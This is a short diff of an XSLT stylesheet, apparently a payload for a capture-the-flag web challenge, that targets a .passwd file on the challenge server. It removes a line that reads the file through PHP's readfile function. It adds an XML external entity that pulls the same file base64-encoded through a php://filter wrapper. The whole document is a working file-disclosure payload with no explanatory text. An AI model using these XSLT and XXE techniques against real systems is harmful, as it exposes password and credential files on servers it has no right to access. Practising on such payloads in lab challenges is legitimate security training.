@@ -1,5 +1,7 @@
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xsl:stylesheet [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch50/.passwd" >
+]>
 <xsl:template match="/">
-<xsl:value-of select="php:function('readfile','/challenge/web-serveur/ch50/.passwd')"/>
+&xxe;
 </xsl:template>
-</xsl:stylesheet>
